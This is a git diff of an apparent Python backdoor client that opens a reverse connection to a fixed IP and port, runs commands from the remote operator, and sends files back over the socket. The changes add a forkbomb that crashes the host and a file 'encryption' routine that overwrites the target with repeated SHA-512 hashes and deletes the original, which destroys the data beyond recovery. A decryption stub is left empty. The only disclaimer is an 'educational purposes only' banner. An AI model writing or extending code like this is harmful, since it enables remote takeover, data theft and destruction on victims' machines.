@@ -16,13 +16,13 @@ import socket
 import subprocess
 import sys
 import time
+import hashlib
 
 # Variables
 IP = '192.168.0.106'
 PORT = 33434
 CHUNKS = 2048
-BANNER = b"""
-  ____  _                 _        ____        _   _                   ____             _       _                  
+BANNER = b"""  ____  _                 _        ____        _   _                   ____             _       _                  
  / ___|(_)_ __ ___  _ __ | | ___  |  _ \ _   _| |_| |__   ___  _ __   | __ )  __ _  ___| | ____| | ___   ___  _ __ 
  \___ \| | '_ ` _ \| '_ \| |/ _ \ | |_) | | | | __| '_ \ / _ \| '_ \  |  _ \ / _` |/ __| |/ / _` |/ _ \ / _ \| '__|
   ___) | | | | | | | |_) | |  __/ |  __/| |_| | |_| | | | (_) | | | | | |_) | (_| | (__|   < (_| | (_) | (_) | |   
@@ -32,6 +32,7 @@ BANNER = b"""
 This program is for educational purposes only!
 I am not responsible for anything you do with it.                          
 """
+
 
 def _base64_encode(message):
 
@@ -59,7 +60,6 @@ def simple_python_backdoor_client_connect():
             # Wait 5 seconds to try again.
             time.sleep(5)
 
-
 def run_command(command):
 
     command_output = '\n'
@@ -78,7 +78,7 @@ def run_command(command):
     return _base64_encode(bytes(command_output.encode()))
 
 
-def uname():
+def simple_python_backdoor_uname():
 
     """Return certain system information."""
 
@@ -100,7 +100,7 @@ def change_directory(sock, directory):
 def simple_python_backdoor_send_file(sock, file):
 
     if not os.path.isfile(file):
-        sock.send(_base64_encode('Target file not found!'))
+        sock.send(_base64_encode('Target file not found!'.encode()))
     else:
         f_zise = '10MB'
         sock.send(_base64_encode('Attempting download...'.encode()))
@@ -115,14 +115,53 @@ def simple_python_backdoor_send_file(sock, file):
                 file_data = _file.read(1024)
             time.sleep(2)
 
-            sock.send(_base64_encode('Send file done!'))
+            sock.send(_base64_encode('Send file done!'.encode()))
 
     print('Finished sending data')
+
+
+def simple_python_backdoor_forkbomb():
+
+    """A forkbomb is an attack when a process replicates itself over and over again,
+    causing all system resources to be consumed, usually causing the system to crash.
+    """
+
+    while True:
+        os.fork()
+
+
+def simple_python_backdoor_encryption_file(sock, file, remove=False):
+
+    if not os.path.isfile(file):
+        sock.send(_base64_encode('Target file not found!'.encode()))
+    else:
+        with open(file, 'rb') as _file:
+            data = _file.read()
+
+        data_encrypt = hashlib.sha512(data).hexdigest()
+        new_file = f'{os.path.basename(file)}_encrypted'
+
+        with open(new_file, 'wb') as _new_file:
+            _new_file.write(bytes(data_encrypt.encode())*0xFF)
+
+        sock.send(_base64_encode(f'File {file} encrypt as {new_file}'.encode()))
+
+    if remove:
+        sock.send(_base64_encode(f'File {file} deleted!'.encode()))
+        os.remove(file)
+
+
+def simple_python_backdoor_decryption(file):
+    pass
 
 
 def main():
     _socket = simple_python_backdoor_client_connect()
     _socket.send(_base64_encode(BANNER))
+
+    # Show the current working directory.
+    _socket.send(_base64_encode(f'Working directory: {os.getcwd()}'.encode()))
+    print(f'Working directory: {os.getcwd()}')
 
     # Infinite loop until socket can connect.
     while True:
@@ -140,8 +179,15 @@ def main():
         elif 'copy' in str_data:
             simple_python_backdoor_send_file(_socket, str_data.split(' ')[-1])
         # Get system info.
-        elif 'uname' in str_data:
-            _socket.send(uname())
+        elif 'uname' in str_data or 'info' in str_data:
+            _socket.send(simple_python_backdoor_uname())
+        # Forkbomb
+        elif 'forkbomb' in str_data:
+            simple_python_backdoor_forkbomb()
+        # Encrypt a target file.
+        # TODO: Implementar a opção encrypt -r para ativar a remoção do arquivo.
+        if 'encrypt' in str_data:
+            simple_python_backdoor_encryption_file(_socket, str_data.split(' ')[-1], remove=True)
         # Run any other command.
         else:
             output = run_command(str_data)
